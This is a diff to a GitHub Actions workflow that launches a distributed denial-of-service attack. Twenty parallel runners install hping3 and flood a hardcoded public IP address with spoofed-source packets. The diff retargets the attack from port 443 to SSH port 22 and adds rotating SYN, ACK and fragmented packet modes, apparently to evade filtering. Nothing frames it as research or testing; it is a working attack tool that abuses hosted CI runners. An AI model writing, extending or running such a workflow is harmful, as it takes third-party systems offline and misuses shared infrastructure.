@@ -3,9 +3,10 @@ on:
   workflow_dispatch:
     inputs:
       target: { default: '57.131.163.31' }
-      port: { default: '443' }
+      port: { default: '22' }
       seconds: { default: '60' }
       randsrc: { default: '1' }
+      mix: { default: '1' }
 jobs:
   l4tcp:
     runs-on: ubuntu-latest
@@ -16,10 +17,21 @@ jobs:
         i: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
       - name: install hping3
-        run: sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq hping3 >/dev/null 2>&1; hping3 -v 2>&1 | head -2
-      - name: syn flood
+        run: sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq hping3 >/dev/null 2>&1; which hping3
+      - name: flood
         run: |
           echo "runner=${{ matrix.i }} ip=$(curl -s --max-time 8 https://api.ipify.org)"
           sleep $(( ${{ matrix.i }} * 2 ))
           RS=""; if [ "${{ inputs.randsrc }}" = "1" ]; then RS="--rand-source"; fi
-          sudo timeout ${{ inputs.seconds }} hping3 --flood -S $RS -p ${{ inputs.port }} ${{ inputs.target }} 2>&1 | tail -5
+          FLAGS="-S"
+          if [ "${{ inputs.mix }}" = "1" ]; then
+            case $(( ${{ matrix.i }} % 4 )) in
+              0) FLAGS="-S" ;;
+              1) FLAGS="-A" ;;
+              2) FLAGS="-A -f" ;;
+              3) FLAGS="-S -f" ;;
+            esac
+          fi
+          echo "flags: $FLAGS"
+          sudo timeout ${{ inputs.seconds }} hping3 --flood $FLAGS $RS -p ${{ inputs.port }} ${{ inputs.target }} 2>&1 | tail -4
+
